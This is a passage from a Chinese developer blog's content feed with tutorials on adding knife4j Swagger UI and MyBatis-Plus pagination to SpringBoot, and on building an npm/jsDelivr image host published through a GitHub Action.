title="三、使用第三方UI（knife4j）"></a>三、使用第三方UI（knife4j）</h2><ol><li><p>在pom.xml文件添加依赖（<a href="https://doc.xiaominfo.com/v2/documentation/">knife4j文档</a>）</p> <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- swagger-bootstrap-ui依赖，不使用增强功能只为swagger-ui换前端皮肤 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.xiaoymin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>knife4j-spring-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 项目地址：<a href="https://github.com/xiaoymin/knife4j">https://github.com/xiaoymin/knife4j</a></p></li><li><p>重新启动项目，访问：<a href="">http://{ip}:{port}/doc.html</a>。</p><ol><li><p><strong>若出现404页面</strong>，且控制台出现<strong><u>No mapping for GET /doc.html</u></strong>的提示。</p></li><li><p><strong>出错原因：</strong>因为doc.html是在jar包里的，需要使用资源处理器注册静态资源。</p></li><li><p><strong>解决办法：</strong>让SpringbootApplication启动类实现WebMvcConfigurer接口，使用资源处理器注册静态资源。</p> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.EnableWebMvc;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringbootApplication</span>  <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(SpringbootApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用SpringBoot项目继承Knif4j访问doc.html页面，出现No mapping for GET /doc.html</span></span><br><span class="line"><span class="comment">     * 出错原因：</span></span><br><span class="line"><span class="comment">     * 因为doc.html是在jar包里的，需要使用资源处理器注册静态资源。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> registry</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span> </span>&#123;</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;doc.html&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/META-INF/resources/&quot;</span>);</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/webjars/**&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/META-INF/resources/webjars/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> SpringBoot </category>
          
          <category> 整合Swagger-UI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
            <tag> Swagger-UI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springboot整合MyBatis-Plus</title>
      <link href="2022/08/24/SpringBoot%E6%95%B4%E5%90%88MyBatis-Plus/"/>
      <url>2022/08/24/SpringBoot%E6%95%B4%E5%90%88MyBatis-Plus/</url>
      
        <content type="html"><![CDATA[<h2 id="springboot整合MyBatis-Plus"><a href="#springboot整合MyBatis-Plus" class="headerlink" title="springboot整合MyBatis-Plus"></a>springboot整合MyBatis-Plus</h2><h3 id="一、添加依赖"><a href="#一、添加依赖" class="headerlink" title="一、添加依赖"></a>一、添加依赖</h3><p>pom.xml中添加：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- mybatis-plus --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="二、配置MyBatis-Plus使用分页插件"><a href="#二、配置MyBatis-Plus使用分页插件" class="headerlink" title="二、配置MyBatis-Plus使用分页插件"></a>二、配置MyBatis-Plus使用分页插件</h3><ol><li><p>新建MybatisPlusConfig类，并在MybatisPlusConfig.java文件中进行配置：</p> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.DbType;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.spring.annotation.MapperScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * MybatisPlus配置</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.qiancheng.springboot.mapper&quot;)</span><span class="comment">//配置扫描mapper包</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MybatisPlusConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 新的分页插件,一缓和二缓遵循mybatis的规则,需要设置 MybatisConfiguration#useDeprecatedExecutor = false 避免缓存出现问题(该属性会在旧插件移除后一同移除)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MybatisPlusInterceptor <span class="title">mybatisPlusInterceptor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        MybatisPlusInterceptor interceptor = <span class="keyword">new</span> MybatisPlusInterceptor();</span><br><span class="line">        interceptor.addInnerInterceptor(<span class="keyword">new</span> PaginationInnerInterceptor(DbType.H2));</span><br><span class="line">        <span class="keyword">return</span> interceptor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>新建一个 xxxMapper 接口继承 BaseMapper&lt;实体类&gt;，例如：</p> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.mapper.BaseMapper;</span><br><span class="line"><span class="keyword">import</span> com.qiancheng.springboot.entity.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> <span class="keyword">extends</span> <span class="title">BaseMapper</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;SELECT * FROM sys_user&quot;)</span></span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">findAll</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>新建xxxService类继承ServiceImpl<xxxMapper,实体类>，例如：</p> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;</span><br><span class="line"><span class="keyword">import</span> com.qiancheng.springboot.entity.User;</span><br><span class="line"><span class="keyword">import</span> com.qiancheng.springboot.mapper.UserMapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserService</span> <span class="keyword">extends</span> <span class="title">ServiceImpl</span>&lt;<span class="title">UserMapper</span>,<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">saveUser</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        if (user.getId() == null)&#123;</span></span><br><span class="line"><span class="comment">//           return save(user);//mybatis-plus提供的方法</span></span><br><span class="line"><span class="comment">//        &#125;else &#123;//user有id则表示修改</span></span><br><span class="line"><span class="comment">//            return updateById(user);//mybatis-plus提供的方法</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="keyword">return</span> saveOrUpdate(user);<span class="comment">//mybatis-plus提供的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>使用MyBatis-Plus提供的简单单表操作方法，例如：</p> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;</span><br><span class="line"><span class="keyword">import</span> com.qiancheng.springboot.entity.User;</span><br><span class="line"><span class="keyword">import</span> com.qiancheng.springboot.mapper.UserMapper;</span><br><span class="line"><span class="keyword">import</span> com.qiancheng.springboot.service.UserService;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.util.Strings;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="comment">//@CrossOrigin //临时解决跨域</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">findAll</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//        使用原始MyBatis方法查询</span></span><br><span class="line"><span class="comment">//        List&lt;User&gt; all = userMapper.findAll();</span></span><br><span class="line"><span class="comment">//        return all;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        使用mybatis-plus方法查询</span></span><br><span class="line">        <span class="keyword">return</span> userService.list();<span class="comment">//list方法为mybatis-plus提供</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/save&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">save</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span></span>&#123;</span><br><span class="line">        <span class="comment">//新增或者更新</span></span><br><span class="line">        <span class="keyword">return</span> userService.saveUser(user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//传统手写分页查询</span></span><br><span class="line">    <span class="comment">//接口路径： /user/page?pageNum=1&amp;pageSize=10</span></span><br><span class="line">    <span class="comment">//@RequestParam注解接收： ?pageNum=1&amp;pageSize=10</span></span><br><span class="line">    <span class="comment">//limit第一个参数：(pageNum-1)*pageSize</span></span><br><span class="line">    <span class="comment">//limit第二个参数：pageSize</span></span><br><span class="line"><span class="comment">//    @GetMapping(&quot;/page&quot;)</span></span><br><span class="line"><span class="comment">//    public Map&lt;String,Object&gt; findPage(@RequestParam Integer pageNum,</span></span><br><span class="line"><span class="comment">//                                       @RequestParam Integer pageSize,</span></span><br><span class="line"><span class="comment">//                                       @RequestParam String username)&#123;</span></span><br><span class="line"><span class="comment">//        Integer pageIndex = (pageNum - 1) * pageSize;</span></span><br><span class="line"><span class="comment">//        List&lt;User&gt; data = userMapper.selectPage(pageIndex,pageSize,username);</span></span><br><span class="line"><span class="comment">//        Integer total = userMapper.selectTotal(username);</span></span><br><span class="line"><span class="comment">//        Map&lt;String,Object&gt; res = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        res.put(&quot;data&quot;,data);</span></span><br><span class="line"><span class="comment">//        res.put(&quot;total&quot;,total);</span></span><br><span class="line"><span class="comment">//        return res;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用MyBatis-Plus分页查询</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/page&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IPage&lt;User&gt; <span class="title">findPage</span><span class="params">(<span class="meta">@RequestParam(required = true)</span> Integer pageNum,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="meta">@RequestParam(required = true)</span> Integer pageSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="meta">@RequestParam(required = false)</span> String username,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="meta">@RequestParam(defaultValue = &quot;&quot;)</span> String nickname,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="meta">@RequestParam(defaultValue = &quot;&quot;)</span> String address)</span></span>&#123;</span><br><span class="line">        IPage&lt;User&gt; page = <span class="keyword">new</span> Page&lt;&gt;(pageNum,pageSize);</span><br><span class="line">        QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();<span class="comment">//分页条件</span></span><br><span class="line">        queryWrapper.like(!Strings.isEmpty(username),<span class="string">&quot;username&quot;</span>,username);<span class="comment">//!Strings.isEmpty(username)表示username不为null时候才加入这个模糊查询条件</span></span><br><span class="line">        queryWrapper.like(!Strings.isEmpty(nickname),<span class="string">&quot;nickname&quot;</span>,nickname);</span><br><span class="line">        queryWrapper.like(!Strings.isEmpty(address),<span class="string">&quot;address&quot;</span>,address);</span><br><span class="line">        IPage&lt;User&gt; userPage = userService.page(page,queryWrapper);</span><br><span class="line">        <span class="keyword">return</span> userPage;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>备注：（MyBatis-Plus官网：<a href="https://baomidou.com/）">https://baomidou.com/）</a></p>]]></content>
      
      
      <categories>
          
          <category> SpringBoot </category>
          
          <category> 整合MyBatis-Plus </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
            <tag> MyBatis-Plus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm图床搭建</title>
      <link href="2021/11/22/npm%E5%9B%BE%E5%BA%8A%E6%90%AD%E5%BB%BA/"/>
      <url>2021/11/22/npm%E5%9B%BE%E5%BA%8A%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>npm图床搭建</p><p class='p center small'>Butterfly主题魔改教程，npm图床搭建。</p><p><br/></p><div class="tip home"><p>我的博客主题版本为：hexo5.4、Butterfly3.6.2</p><p>如果与我的版本不一样可能会有略微差别，届时请自行百度。</p><p>本文参考文章：<a href="https://akilar.top/posts/3e956346/">Akilarの糖果屋的《npm 图床的使用技巧》</a>。</p></div><h1 id="1-创建一个GitHub仓库存储图片"><a href="#1-创建一个GitHub仓库存储图片" class="headerlink" title="1.创建一个GitHub仓库存储图片"></a>1.创建一个GitHub仓库存储图片</h1><ol><li><p>首先创建一个图床仓库用来存放图片，仓库名随意。以下会以 <code>[AssetsRepo]</code> 指代这个静态资源仓库。</p><p> <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo@1.0.8/npm_tuchuangdajian/c3fffaba.png" alt=""></p></li><li><p>访问 <a href="https://github.com/settings/tokens">Github-&gt; 头像（右上角）-&gt;Settings-&gt;Developer Settings-&gt;Personal access tokens</a>-&gt;<kbd>generate new token</kbd>, 创建的 <code>Token</code> 名称随意，但必须勾选 <code>repo</code> 项。</p><p> <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo@1.0.8/npm_tuchuangdajian/PISlRDgrsBXzcLK.png" alt=""></p><p> <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo@1.0.8/npm_tuchuangdajian/yF8cNUkmAJVBSuw.png" alt=""></p><p> <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo@1.0.8/npm_tuchuangdajian/20200923085908748.png" alt=""></p> <div class="note warning flat"><p><code>token</code> 只会显示这一次，之后将无法查看，所以务必保证你已经记录下了 <code>Token</code>。之后如果忘记了就只能重新生成重新配置了。</p></div></li></ol><h1 id="2-使用Picgo管理GitHub图床"><a href="#2-使用Picgo管理GitHub图床" class="headerlink" title="2.使用Picgo管理GitHub图床"></a>2.使用Picgo管理GitHub图床</h1><ol><li><p>下载 Picgo 软件，可以直接访问 Picgo 的 github 仓库，在 <a href="https://github.com/Molunerfinn/picgo/releases">release</a> 中下载最新版本的安装包。</p> <a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/Molunerfinn/picgo"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=Molunerfinn&repo=picgo&theme=solarized-dark&show_owner=true"/></a></li><li><p>打开 Picgo，找到图床设置，选择<code>Github</code>图床，根据指示填写对应内容。</p> <div class="note info modern"><ul><li><p>设定仓库名：[UserName]/[AssetsRepo]</p></li><li><p>设定分支名：2020 年 10 月后 github 新建仓库默认分支改为 <code>main</code>, 在这之前的是 <code>master</code>。</p></li><li><p>设定 Token：填入第二步时申请到的 <code>Token</code></p></li><li><p>指定存储路径：这是存放图片的路径，这里可以直接写 <code>/</code> 表示存放在根目录。</p></li><li><p>设定自定义域名：在图片上传后，PicGo 会按照<code>自定义域名+指定储存路径+上传的图片名</code>的方式生成访问链接，并放到粘贴板上，例如要使用 <code>jsDelivr</code> 加速，则设置为 <code>https://cdn.jsdelivr.net/gh/[UserName]/[AssetsRepo]</code>，上传完毕后，我们就可以通过 <code>https://cdn.jsdelivr.net/gh/[UserName]/[AssetsRepo]/指定存储路径/图片名</code>加速访问我们的图片了。</p></li></ul></div></li></ol><h1 id="3-npm图床使用"><a href="#3-npm图床使用" class="headerlink" title="3.npm图床使用"></a>3.npm图床使用</h1><ol><li><p>首先需要注册一个 npm 的账号。访问 <a href="https://www.npmjs.com/signup/">npm 注册页面</a></p><p> <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo@1.0.8/npm_tuchuangdajian/a935a0d4.png" alt=""></p></li><li><p>完成邮箱验证，注册完成后进入账号管理界面:<kbd>头像</kbd> -&gt;<kbd>Account</kbd>，拉倒最上方，你会看到 <code>You have not verified your email address</code> 字样的提示，点击以后按提示步骤验证你的邮箱。</p><p> <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo@1.0.8/npm_tuchuangdajian/85e92b51.png" alt=""></p></li><li><p>找到我们之前创建的图床仓库，在本地合适的位置把它 <code>clone</code> 下来。找个空文件夹打开终端输入：</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:[username]/[AssetsRepo].git</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/[username]/[AssetsRepo].git</span><br></pre></td></tr></table></figure></li><li><p>在 clone 下来的 [AssetsRepo] 文件夹内打开终端，输入以下指令切换回原生源：</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmjs.org</span><br></pre></td></tr></table></figure></li><li><p>添加本地 npm 用户设置</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仅第一次使用需要添加用户，之后会提示你输入你的npm账号密码以及注册邮箱</span></span><br><span class="line">npm adduser</span><br><span class="line"><span class="comment"># 非第一次使用直接登录即可，之后会提示你输入你的npm账号密码以及注册邮箱</span></span><br><span class="line">npm login</span><br></pre></td></tr></table></figure></li><li><p>运行 npm 初始化指令，把整个图床仓库打包，按照指示进行配置，<strong><code>注意需要事先确认你的包名没有和别人已发布的包重复</code></strong>，可以在 <a href="https://www.npmjs.com/">npm 官网</a>搜索相应包名，搜不到就说明还没被占用。</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure><p> <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo@1.0.8/npm_tuchuangdajian/6000c029.png" alt=""></p><p> 最后会输出一段 package.json，请求确认，输入 yes 即可。</p></li><li><p>然后输入发布指令，我们就可以把包发布到 npm 上了。</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure></li><li><p>jsdelivr+npm 的图片引用和 jsdelivr+github 很相似，例如：访问我在 <code>[AssetsRepo]</code> 仓库里存放的 <code>/img/index.png</code>。</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># jsDelivr+github链接</span></span><br><span class="line">https://cdn.jsdelivr.net/gh/[GithubUserName]/[AssetsRepo]/img/index.png</span><br><span class="line"><span class="comment"># jsDelivr+npm链接</span></span><br><span class="line">https://cdn.jsdelivr.net/npm/[NpmPackageName]/img/index.png</span><br></pre></td></tr></table></figure> <div class="tip success"><p>可以看到 Npm 只需要提供包名即可。这也是一开始要求包名不重复的原因之一</p></div> <div class="tip bolt"><p>jsDelivr+Npm 依然有 100MB 的包大小限制，但是 NPM 有丰富的国内节点。可以挑选一个使用。个人推荐知乎的。没有大小限制，而且也很稳定。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">【jsd出品，网宿国内节点】</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;:package@:version&#x2F;:file</span><br><span class="line">【知乎出品，网宿国内节点】</span><br><span class="line">主域名国内访问速度较慢，但有适合国内访问的镜像地址</span><br><span class="line">主域名：https:&#x2F;&#x2F;unpkg.com&#x2F;:package@:version&#x2F;:file</span><br><span class="line">镜像地址：https:&#x2F;&#x2F;unpkg.zhimg.com&#x2F;:package@:version&#x2F;:file</span><br><span class="line">【百度出品，网宿国内节点】</span><br><span class="line">https:&#x2F;&#x2F;code.bdstatic.com&#x2F;npm&#x2F;:package@:version&#x2F;:file</span><br><span class="line">【饿了么出品，网宿国内节点】</span><br><span class="line">https:&#x2F;&#x2F;npm.elemecdn.com&#x2F;:package@:version&#x2F;:file</span><br><span class="line">https:&#x2F;&#x2F;shadow.elemecdn.com&#x2F;npm&#x2F;:package@:version&#x2F;:file</span><br></pre></td></tr></table></figure></div></li></ol><p>知乎引用效果图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://unpkg.com/qianchengnpm-blogassetsrepo@1.0.5/img/t01678c7fa1f713fb19.jpg" alt=""></p><p>百度引用效果图：</p><pre><code>![](https://code.bdstatic.com/npm/qianchengnpm-blogassetsrepo@1.0.5/img/t015a1f3a7dd7422ae0.jpg)</code></pre><h1 id="4-使用GitHub-Action自动发布npm包"><a href="#4-使用GitHub-Action自动发布npm包" class="headerlink" title="4.使用GitHub Action自动发布npm包"></a>4.使用GitHub Action自动发布npm包</h1><p>如果每次都要在本地进行 <code>npm publish</code> 的话，npm 的提交是整个包一起上传的，不存在增量更新，耗时不说，而且还往往需要架梯子才能正常上传。所以我们可以把它交给 github action 来完成。</p><ol><li><p>在 <a href="https://www.npmjs.com/">npm 官网</a> -&gt;<kbd>头像</kbd> -&gt;<kbd>Access Tokens</kbd>-&gt;<kbd>Generate New Token</kbd>, 勾选<kbd>Automation</kbd> 选项，然后点击<kbd>Generate Token</kbd>生成<code>Token</code> ，<code>Token</code> 只会显示这一次，之后如果忘记了就只能重新生成重新配置了。</p><p> <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo@1.0.8/npm_tuchuangdajian/0e884db2.png" alt=""></p><p> <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo@1.0.8/npm_tuchuangdajian/0158bc90.png" alt=""></p></li><li><p>在 github 的 [AssetsRepo] 仓库设置项里添加一个名为 <code>NPM_TOKEN</code> 的 <code>secrets</code>，把获取的 Npm 的 Access token 输入进去。</p><p> <img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo@1.0.8/npm_tuchuangdajian/c6dbbfb5.png" alt=""></p></li><li><p>在本地的 <code>[AssetsRepo]</code> 文件夹下新建 <code>[AssetsRepo]/.github/workflows/autopublish.yml</code>,然后输入下面内容：</p> <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Node.js</span> <span class="string">Package</span></span><br><span class="line"><span class="comment"># 监测图床分支，2020年10月后github新建仓库默认分支改为main，记得更改</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">publish-npm:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&quot;12.x&quot;</span></span><br><span class="line">          <span class="attr">registry-url:</span> <span class="string">https://registry.npmjs.org/</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">publish</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">NODE_AUTH_TOKEN:</span> <span class="string">$&#123;&#123;secrets.npm_token&#125;&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>在本地的 <code>[AssetsRepo]</code> 文件夹下打开终端，运行以下指令，上传新增内容至 github，即可触发部署。</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将更改提交</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;npm publish&quot;</span></span><br><span class="line"><span class="comment"># 更新package版本号</span></span><br><span class="line">npm version patch</span><br><span class="line"><span class="comment"># 推送至github触发action</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure> <div class="note warning modern"><p>注意：⑴.此处的四行指令顺序严格。</p><p>⑵.每次更新 npm 图床都需要先修改 <code>[AssetsRepo]\package.json</code> 里的 <code>version</code>, 也就是版本号。而 <code>npm version patch</code> 即为更新 package.json 里的版本号的指令，效果是末尾版本号 + 1，例如 <code>0.0.1=&gt;0.0.2</code>、<code>1.1.3=&gt;1.1.4</code>。免去了打开 <code>package.json</code> 再修改版本号的麻烦（大版本更新还是需要手动改的）。</p><p>⑶.更新 npm 图床务必要记得更新 <code>package.json</code> 里的版本号！</p></div></li></ol><div class="note primary modern"><p class='p red center small'>为了更直观的展示原理，流程图如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://npm.elemecdn.com/qianchengnpm-blogassetsrepo@1.0.8/npm_tuchuangdajian/npm%E5%9B%BE%E5%BA%8A%E6%8F%90%E4%BA%A4%E6%B5%81%E7%A8%8B.png" alt="流程图"></p></div><h1 id="5-注意事项"><a href="#5-注意事项" class="headerlink" title="5.注意事项"></a>5.注意事项</h1><div class="tip bolt"><ol><li>虽然GitHub 公开仓库大小为 100GB，并且可以创建无数个仓库！但是这 100GB 我们并不能全用完，甚至每个仓库不能超过 1G。因为官方的解释是尽量不要传大文件，且仓库超过 1G 